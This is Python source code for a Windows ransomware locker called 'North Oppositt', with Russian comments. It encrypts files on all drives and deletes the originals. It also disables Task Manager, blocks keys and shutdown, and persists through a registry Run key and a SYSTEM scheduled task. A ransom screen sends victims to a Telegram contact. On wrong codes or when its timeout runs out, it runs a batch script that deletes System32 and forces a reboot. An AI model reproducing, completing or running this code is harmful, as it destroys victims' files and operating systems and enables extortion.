import tkinter as tk
import os
import sys
import winreg as reg
import threading
import time
import subprocess
import ctypes
import winsound
import hashlib
import random
import datetime
import atexit
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# ПРОВЕРКА ЗАВИСИМОСТЕЙ
# ============================================================
try:
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    from comtypes import CLSCTX_ALL
    from cryptography.fernet import Fernet
    import psutil
    import keyboard as kb
except ImportError:
    sys.exit(1)

# ============================================================
# ГЛОБАЛЬНЫЕ БЛОКИРОВКИ
# ============================================================
count_lock = threading.Lock()
reg_lock = threading.Lock()
hook_active = False  # флаг, что хук уже установлен

# ============================================================
# ПЕРЕХВАТ ЗАВЕРШЕНИЯ
# ============================================================
ctypes.windll.kernel32.SetConsoleCtrlHandler(lambda x: True, 1)

# ============================================================
# ЕДИНСТВЕННЫЙ ЭКЗЕМПЛЯР
# ============================================================
def check_single_instance():
    try:
        lock_file = os.path.join(os.environ['TEMP'], 'north_oppositt.lock')
        try:
            with open(lock_file, 'x') as f:
                f.write(str(os.getpid()))
        except FileExistsError:
            with open(lock_file, 'r') as f:
                old_pid = int(f.read().strip())
            try:
                if psutil.pid_exists(old_pid):
                    sys.exit(0)
            except:
                pass
            with open(lock_file, 'w') as f:
                f.write(str(os.getpid()))
        atexit.register(lambda: os.remove(lock_file) if os.path.exists(lock_file) else None)
    except:
        pass

# ============================================================
# РЕСУРСЫ
# ============================================================
def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
    return os.path.join(base_path, relative_path)

def play_music_loop(stop_flag):
    try:
        wav_path = resource_path("sound.wav")
        if os.path.exists(wav_path):
            winsound.PlaySound(wav_path, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
        else:
            while not stop_flag.is_set():
                winsound.MessageBeep(winsound.MB_ICONHAND)
                time.sleep(1)
    except:
        pass

# ============================================================
# НАГРУЗКА
# ============================================================
def cpu_load(stop_flag):
    x = random.randint(1, 1000)
    while not stop_flag.is_set():
        for _ in range(10000):
            x = hashlib.sha256(str(x).encode()).hexdigest()
        time.sleep(0.01)

def ram_load(stop_flag):
    data = []
    while not stop_flag.is_set():
        try:
            if psutil.virtual_memory().percent < 85:
                data.append('x' * 10 * 1024 * 1024)
            else:
                if len(data) > 2:
                    data.pop(0)
        except:
            data = []
        time.sleep(0.5)

def disk_load(stop_flag):
    temp_dir = os.environ.get('TEMP', os.getcwd())
    f_path = os.path.join(temp_dir, 'north_temp_load.tmp')
    buf = os.urandom(1024 * 1024)
    while not stop_flag.is_set():
        try:
            with open(f_path, 'wb') as f:
                for _ in range(50):
                    f.write(buf)
            if os.path.exists(f_path):
                os.remove(f_path)
        except:
            pass
        time.sleep(1)

def start_system_load(stop_flag):
    threading.Thread(target=cpu_load, args=(stop_flag,), daemon=True).start()
    threading.Thread(target=ram_load, args=(stop_flag,), daemon=True).start()
    threading.Thread(target=disk_load, args=(stop_flag,), daemon=True).start()

# ============================================================
# СИСТЕМНЫЕ ОПЕРАЦИИ
# ============================================================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        new_args = sys.argv + ['--admin']
        exe = f'"{sys.executable}"' if ' ' in sys.executable else sys.executable
        args_line = " ".join(f'"{a}"' if ' ' in a else a for a in new_args)
        cmd = f'{exe} {args_line}'
        ctypes.windll.shell32.ShellExecuteW(None, "runas", None, cmd, None, 1)
        sys.exit(0)
    return True

def add_to_startup():
    try:
        if not getattr(sys, 'frozen', False):
            return
        exe_path = sys.executable
        if ' ' in exe_path:
            exe_path = f'"{exe_path}"'
        with reg_lock:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "SystemUpdateGuard", 0, reg.REG_SZ, exe_path)
            reg.CloseKey(key)

        task_name = "SystemUpdateGuard"
        subprocess.run(
            f'schtasks /create /tn "{task_name}" /tr {exe_path} /sc ONLOGON /ru "SYSTEM" /rl HIGHEST /f /delay 0000:00',
            shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def toggle_task_manager(disable=True):
    try:
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with reg_lock:
            key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
            reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1 if disable else 0)
            reg.CloseKey(key)
    except:
        pass

def force_max_volume(stop_flag):
    try:
        ctypes.oledll.ole32.CoInitialize(None)
        devices = AudioUtilities.GetSpeakers()
        if not devices:
            return
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
        while not stop_flag.is_set():
            volume.SetMasterVolumeLevelScalar(1.0, None)
            time.sleep(0.5)
    except:
        pass

# ============================================================
# КОРРЕКТНЫЙ БЛОК КЛАВИАТУРЫ
# ============================================================
def block_keyboard():
    global hook_active
    if hook_active:
        return
    hook_active = True

    allowed_keys = {
        # Цифры
        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
        # Управление для ввода
        'backspace', 'enter', 'tab',
        # Стрелки (курсор в поле ввода)
        'left', 'right', 'home', 'end',
    }

    def on_key_event(e):
        # Всегда разрешаем мышь — её keyboard не перехватывает,
        # но на всякий случай пропускаем Mouse события
        if e.event_type == 'down' or e.event_type == 'up':
            if e.name in allowed_keys:
                return  # пропускаем
            else:
                return False  # блокируем

    kb.hook(on_key_event, suppress=True)

    # Доп. защита: отключаем системные комбинации
    # Win, Alt+Tab, Ctrl+Esc, Alt+F4
    for hotkey in ['alt+tab', 'alt+f4', 'ctrl+esc', 'win', 'win+d', 'win+e', 'win+r', 'win+l', 'ctrl+shift+esc']:
        try:
            kb.add_hotkey(hotkey, lambda: None, suppress=True)
        except:
            pass

def unhook_keyboard():
    global hook_active
    hook_active = False
    kb.unhook_all()
    # Удаляем все кастомные хоткеи
    try:
        kb.remove_all_hotkeys()
    except:
        pass

# ============================================================
# БЛОКИРОВКА SHUTDOWN
# ============================================================
def block_shutdown_window():
    """Блокируем завершение Windows через API"""
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(
            ctypes.windll.user32.GetForegroundWindow(),
            "Идёт обслуживание системы"
        )
    except:
        pass

def unblock_shutdown_window():
    try:
        ctypes.windll.user32.ShutdownBlockReasonDestroy(
            ctypes.windll.user32.GetForegroundWindow()
        )
    except:
        pass

def monitor_reboot_attempts(stop_flag):
    # Убираем кнопку выключения из Пуска
    try:
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        with reg_lock:
            key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
            reg.SetValueEx(key, "NoClose", 0, reg.REG_DWORD, 1)
            reg.CloseKey(key)
    except:
        pass

    block_shutdown_window()

    while not stop_flag.is_set():
        try:
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() in ['shutdown.exe', 'logoff.exe', 'wpeutil.exe']:
                        proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except:
            pass
        time.sleep(0.5)

# ============================================================
# ЯДЕРНЫЙ УДАР
# ============================================================
def reboot_and_nuke():
    bat_path = os.path.join(os.environ['TEMP'], 'north_nuke.bat')
    try:
        with open(bat_path, 'w') as f:
            f.write('''@echo off
timeout /t 3 /nobreak >nul
takeown /f "C:\\Windows\\System32" /r /d y 2>nul
icacls "C:\\Windows\\System32" /grant *S-1-1-0:F /t 2>nul
rmdir /s /q "C:\\Windows\\System32" 2>nul
del /f /q "%~f0"
''')
        task_name = "System32NukeTask"
        cmd = f'schtasks /create /tn "{task_name}" /tr "{bat_path}" /sc ONSTART /ru "SYSTEM" /rl HIGHEST /f'
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    os.system("shutdown /r /t 0 /f")

# ============================================================
# ФАЙЛЫ
# ============================================================
def create_fake_files(stop_flag):
    counter = 0
    temp_dir = os.environ.get('TEMP', os.getcwd())
    while not stop_flag.is_set():
        try:
            f_path = os.path.join(temp_dir, f'system_{counter}_{random.randint(100,999)}.tmp')
            with open(f_path, 'wb') as f:
                f.write(os.urandom(1024 * 1024))
            counter += 1
            time.sleep(2)
        except:
            time.sleep(5)

def encrypt_single_file(args):
    path, fernet = args
    try:
        if path.endswith(".north") or "Windows" in path or "NorthOppositt" in path:
            return 0
        with open(path, 'rb') as f:
            data = f.read()
        if not data:
            return 0
        encrypted = fernet.encrypt(data)
        new_path = path + ".north"
        idx = 1
        base_p = new_path
        while os.path.exists(new_path):
            new_path = f"{base_p}_{idx}"
            idx += 1
        with open(new_path, 'wb') as f:
            f.write(encrypted)
        os.remove(path)
        return 1
    except:
        return 0

def continuous_encryption(stop_flag, fernet, encrypted_count_list):
    drives = ['C:\\', 'D:\\', 'E:\\', 'F:\\']
    valid_drives = [d for d in drives if os.path.exists(d)]

    skip_dirs = {
        'Windows', 'Program Files', 'Program Files (x86)',
        '$Recycle.Bin', 'System Volume Information',
        'Recovery', 'Boot', 'boot', 'Config.Msi',
        'MSOCache', 'PerfLogs'
    }
    skip_user_dirs = {'AppData', 'ntuser.dat', 'NTUSER.DAT'}

    while not stop_flag.is_set():
        try:
            files_to_encrypt = []
            for drive in valid_drives:
                try:
                    for root, dirs, files in os.walk(drive, topdown=True):
                        base = os.path.basename(root)
                        if base in skip_dirs:
                            dirs[:] = []
                            continue
                        dirs[:] = [d for d in dirs if d not in skip_user_dirs]
                        for file in files:
                            files_to_encrypt.append((os.path.join(root, file), fernet))
                            if len(files_to_encrypt) >= 50:
                                break
                        if len(files_to_encrypt) >= 50:
                            break
                except PermissionError:
                    continue

            if files_to_encrypt:
                with ThreadPoolExecutor(max_workers=4) as executor:
                    results = executor.map(encrypt_single_file, files_to_encrypt)
                    new_count = sum(results)
                    with count_lock:
                        encrypted_count_list[0] += new_count
            time.sleep(5)
        except:
            time.sleep(10)

# ============================================================
# РАСШИФРОВКА
# ============================================================
def decrypt_single_file(args):
    path, fernet = args
    try:
        if not path.endswith(".north"):
            return 0
        with open(path, 'rb') as f:
            data = f.read()
        decrypted = fernet.decrypt(data)
        orig_path = path[:-6]
        if os.path.exists(orig_path):
            base, ext = os.path.splitext(orig_path)
            idx = 1
            while os.path.exists(f"{base}_restored_{idx}{ext}"):
                idx += 1
            orig_path = f"{base}_restored_{idx}{ext}"
        with open(orig_path, 'wb') as f:
            f.write(decrypted)
        os.remove(path)
        return 1
    except:
        return 0

def decrypt_all_files(fernet):
    files_to_decrypt = []
    for drive in ['C:\\', 'D:\\', 'E:\\', 'F:\\']:
        if os.path.exists(drive):
            for root, dirs, files in os.walk(drive):
                for file in files:
                    if file.endswith(".north"):
                        files_to_decrypt.append((os.path.join(root, file), fernet))
        if len(files_to_decrypt) > 10000:
            break
    if not files_to_decrypt:
        return 0
    with ThreadPoolExecutor(max_workers=8) as executor:
        results = executor.map(decrypt_single_file, files_to_decrypt)
        return sum(results)

def restore_system():
    toggle_task_manager(False)
    unhook_keyboard()
    try:
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        with reg_lock:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_SET_VALUE)
            try:
                reg.DeleteValue(key, "NoClose")
            except FileNotFoundError:
                pass
            reg.CloseKey(key)
    except:
        pass
    unblock_shutdown_window()

# ============================================================
# ГЛАВНЫЙ ИНТЕРФЕЙС
# ============================================================
class NorthOpposittLocker:
    def __init__(self, root):
        self.root = root
        self.root.attributes("-fullscreen", True, "-topmost", True)
        self.root.configure(bg='#0a0a0a')
        self.root.protocol("WM_DELETE_WINDOW", lambda: self.factory_reset())

        self.attempts = 5
        self.stop_flag = threading.Event()
        self.encrypted_count = [0]

        check_single_instance()
        if is_admin():
            toggle_task_manager(True)
            block_keyboard()
            add_to_startup()
            threading.Thread(target=monitor_reboot_attempts, args=(self.stop_flag,), daemon=True).start()

        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)

        threading.Thread(target=force_max_volume, args=(self.stop_flag,), daemon=True).start()
        threading.Thread(target=play_music_loop, args=(self.stop_flag,), daemon=True).start()
        threading.Thread(target=create_fake_files, args=(self.stop_flag,), daemon=True).start()
        threading.Thread(target=continuous_encryption, args=(self.stop_flag, self.fernet, self.encrypted_count), daemon=True).start()
        start_system_load(self.stop_flag)

        self.show_locker_screen()
        threading.Thread(target=self.timer_loop, daemon=True).start()
        self.update_file_count_loop()

        # Дополнительная защита: окно всегда ПОВЕРХ ВСЕХ
        self.keep_on_top()

    def keep_on_top(self):
        """Каждые 0.3 секунды возвращаем окно поверх всех"""
        def _keep():
            while not self.stop_flag.is_set():
                try:
                    self.root.attributes("-topmost", True)
                    self.root.lift()
                    self.root.focus_force()
                except:
                    pass
                time.sleep(0.3)
        threading.Thread(target=_keep, daemon=True).start()

    def show_locker_screen(self):
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(expand=True, fill='both')

        logo_text = """
    ╔═══════════════════════════════════════╗
    ║      NORTH OPPOSITT RANSOMWARE v3.0   ║
    ╚═══════════════════════════════════════╝
        """
        logo = tk.Label(main_frame, text=logo_text, fg="#ff4444", bg="#0a0a0a",
                        font=("Courier", 14, "bold"), justify="center")
        logo.pack(pady=20)

        creators = tk.Label(main_frame, text="created by iaefeel & gflm",
                            fg="#ff4444", bg="#0a0a0a",
                            font=("Segoe UI", 9, "bold"), justify="center")
        creators.pack(pady=(0, 10))

        self.timer_label = tk.Label(main_frame, text="⏰ ОСТАЛОСЬ ВРЕМЕНИ: 24:00:00",
                                    fg="#ffaa00", bg="#0a0a0a",
                                    font=("Segoe UI", 16, "bold"))
        self.timer_label.pack(pady=10)

        self.attempts_label = tk.Label(main_frame, text=f"Попыток осталось: {self.attempts}",
                                       fg="#ffaa00", bg="#0a0a0a",
                                       font=("Segoe UI", 12, "bold"))
        self.attempts_label.pack(pady=5)

        self.file_count_label = tk.Label(main_frame, text="Зашифровано файлов: 0",
                                         fg="#00ff00", bg="#0a0a0a",
                                         font=("Segoe UI", 12))
        self.file_count_label.pack(pady=5)

        msg = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ❌ ВСЕ ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ! ❌                     ║
║                                                              ║
║   🔐 ДЛЯ ПОЛУЧЕНИЯ КОДА: Telegram @societyvoice             ║
║                                                              ║
║   ⚠️ 5 НЕВЕРНЫХ ПОПЫТОК = ПЕРЕЗАГРУЗКА + УДАЛЕНИЕ SYSTEM32   ║
║   ⚠️ ПОПЫТКА ПЕРЕЗАГРУЗИТЬ ПК = УДАЛЕНИЕ SYSTEM32           ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        msg_label = tk.Label(main_frame, text=msg, fg="#cccccc", bg="#0a0a0a",
                             font=("Consolas", 10), justify="center")
        msg_label.pack(pady=20)

        input_frame = tk.Frame(main_frame, bg='#0a0a0a')
        input_frame.pack(pady=10)
        tk.Label(input_frame, text="ВВЕДИТЕ КОД:", fg="white", bg="#0a0a0a",
                 font=("Segoe UI", 12, "bold")).pack(side="left", padx=5)
        self.code_entry = tk.Entry(input_frame, font=("Consolas", 14), width=15,
                                   justify='center', bg="#1a1a1a", fg="#00ff00",
                                   insertbackground="white")
        self.code_entry.pack(side="left", padx=5)
        self.code_entry.focus_set()

        button_frame = tk.Frame(main_frame, bg='#0a0a0a')
        button_frame.pack(pady=20)
        tk.Button(button_frame, text="🔓 РАСШИФРОВАТЬ", command=self.check_code,
                  bg="#ff4444", fg="white", font=("Segoe UI", 11, "bold"),
                  width=20).pack(side="left", padx=10)
        tk.Button(button_frame, text="💀 УНИЧТОЖИТЬ WINDOWS", command=self.factory_reset,
                  bg="#333333", fg="white", font=("Segoe UI", 11, "bold"),
                  width=20).pack(side="left", padx=10)

    def timer_loop(self):
        end_time = datetime.datetime.now() + datetime.timedelta(hours=24)
        while not self.stop_flag.is_set():
            time_left = (end_time - datetime.datetime.now()).total_seconds()
            if time_left <= 0:
                self.factory_reset()
                return
            hours, rem = divmod(int(time_left), 3600)
            minutes, seconds = divmod(rem, 60)
            self.timer_label.config(
                text=f"⏰ ОСТАЛОСЬ ВРЕМЕНИ: {hours:02d}:{minutes:02d}:{seconds:02d}"
            )
            time.sleep(1)

    def update_file_count_loop(self):
        while not self.stop_flag.is_set():
            with count_lock:
                count = self.encrypted_count[0]
            self.file_count_label.config(text=f"Зашифровано файлов: {count}")
            time.sleep(3)

    def check_code(self):
        SECRET_CODE = "192837465"
        entered_code = self.code_entry.get().strip()

        if entered_code == SECRET_CODE:
            self.stop_flag.set()
            winsound.PlaySound(None, winsound.SND_PURGE)
            decrypted_count = decrypt_all_files(self.fernet)
            restore_system()
            self.root.destroy()
        else:
            self.attempts -= 1
            self.attempts_label.config(text=f"Попыток осталось: {self.attempts}")
            self.code_entry.delete(0, tk.END)
            winsound.MessageBeep(winsound.MB_ICONERROR)
            if self.attempts <= 0:
                self.factory_reset()

    def factory_reset(self):
        reboot_and_nuke()


# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    if '--admin' in sys.argv:
        check_single_instance()
        root = tk.Tk()
        app = NorthOpposittLocker(root)
        root.mainloop()
    else:
        run_as_admin()
